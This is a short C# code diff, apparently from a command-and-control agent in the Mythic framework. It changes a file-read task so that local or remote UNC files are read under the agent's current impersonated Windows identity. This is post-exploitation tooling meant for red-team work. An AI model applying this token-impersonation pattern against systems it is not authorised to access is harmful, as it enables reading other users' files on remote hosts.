@@ -58,7 +58,11 @@ namespace Tasks
                     } else
                     {
                         string path = string.IsNullOrEmpty(parameters.Hostname) ? parameters.FileName : $@"\\{parameters.Hostname}\{parameters.FileName}";
-                        byte[] fileBytes = File.ReadAllBytes(path);
+                        byte[] fileBytes = new byte[0];
+                        using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
+                        {
+                            fileBytes = File.ReadAllBytes(path);   
+                        }
                         IMythicMessage[] artifacts = new IMythicMessage[1]
                         {
                             new Artifact
